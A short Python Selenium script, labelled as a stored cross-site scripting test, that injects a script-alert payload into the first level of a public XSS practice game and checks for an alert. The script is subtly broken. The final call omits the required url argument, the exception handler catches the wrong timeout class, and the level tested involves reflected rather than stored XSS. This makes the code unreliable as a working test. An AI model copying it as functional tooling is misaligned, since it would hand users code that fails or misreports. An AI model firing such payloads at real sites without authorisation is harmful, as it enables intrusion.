# Testing stored cross site scripting
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.support.ui import WebDriverWait as wait

regular_payload = "<script>alert('XSS')</script>"

def test_stored_xss(url):
    url = "https://xss-game.appspot.com/level1"
    driver = webdriver.Firefox()
    driver.get(url)
    gamer = driver.find_element(By.XPATH, "//iframe[@class='game-frame']")
    wait(driver, 80).until(EC.frame_to_be_available_and_switch_to_it(gamer))
    # Locate the input field where the user enters their message
    user_message_input = driver.find_element(By.ID, "query")
    # Inject a simple XSS payload into the input field
    user_message_input.send_keys(regular_payload)
    # Submit the form
    submit_button = driver.find_element(By.ID, "button")
    submit_button.click()
    # Wait for the XSS payload to execute
    try:
        alert = WebDriverWait(driver, 3).until(EC.alert_is_present())
        alert.accept()
        print("XSS vulnerability found!")
    except TimeoutError:
        print("No XSS vulnerability found.")
    driver.quit()

test_stored_xss()

